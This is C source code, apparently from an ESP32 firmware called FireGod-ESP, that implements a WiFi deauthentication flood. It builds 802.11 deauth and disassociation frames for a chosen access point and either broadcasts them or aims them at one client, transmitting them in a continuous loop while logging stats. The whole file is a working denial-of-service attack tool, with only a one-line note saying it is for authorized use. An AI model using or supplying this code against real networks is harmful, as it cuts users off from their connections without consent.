// ============================================================
// FireGod-ESP — Deauthentication Flood
// Injects 802.11 deauth + disassoc frames to disconnect clients
// from a target AP. Authorized testing on own networks only.
// ============================================================

#include "deauth.h"
#include "fg_globals.h"
#include "core/wifi_manager.h"
#include "wifi_frames.h"
#include <esp_wifi.h>
#include <string.h>

// Parse "AA:BB:CC:DD:EE:FF" into 6 bytes; returns true on success.
static bool parse_mac(const char* s, uint8_t* mac) {
    if (!s) return false;
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
    return true;
}

void fg_deauth(const char* bssidStr, const char* targetStr, uint8_t channel) {
    uint8_t bssid[6];
    if (!parse_mac(bssidStr, bssid)) {
        fg_send_result("{\"event\":\"error\",\"msg\":\"deauth: bad BSSID (use AA:BB:CC:DD:EE:FF)\"}");
        return;
    }
    uint8_t target[6];
    bool broadcast = true;
    if (targetStr && *targetStr && parse_mac(targetStr, target)) broadcast = false;
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    const uint8_t* dst = broadcast ? bcast : target;

    if (channel < 1 || channel > 14) channel = FG_AP_CHANNEL;
    fg_wifi_enter_tx_mode(channel);

    String bs = fg_mac_to_str(bssid);
    fg_send_result_fmt(
        "{\"event\":\"log\",\"msg\":\"Deauth %s on ch%u (%s)\"}",
        bs.c_str(), (unsigned)channel, broadcast ? "broadcast" : "targeted");

    uint8_t deauthFrame[26];
    uint8_t disassocFrame[26];
    int dlen = fg_build_deauth(deauthFrame, bssid, dst, false);
    int alen = fg_build_deauth(disassocFrame, bssid, dst, true);

    uint32_t sent = 0;
    uint32_t lastStat = millis();
    while (!g_stopRequested) {
        // Burst: both subtypes, a few times, then yield.
        for (int i = 0; i < 8 && !g_stopRequested; i++) {
            fg_wifi_raw_tx(deauthFrame, dlen);
            fg_wifi_raw_tx(disassocFrame, alen);
            sent += 2;
        }
        uint32_t now = millis();
        if (now - lastStat >= 1000) {
            lastStat = now;
            fg_send_result_fmt(
                "{\"event\":\"spam_stats\",\"type\":\"deauth\",\"sent\":%lu,\"ch\":%u}",
                (unsigned long)sent, (unsigned)channel);
        }
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    esp_wifi_set_promiscuous(false);
    fg_send_result_fmt(
        "{\"event\":\"scan_complete\",\"type\":\"deauth\",\"count\":%lu}",
        (unsigned long)sent);
}
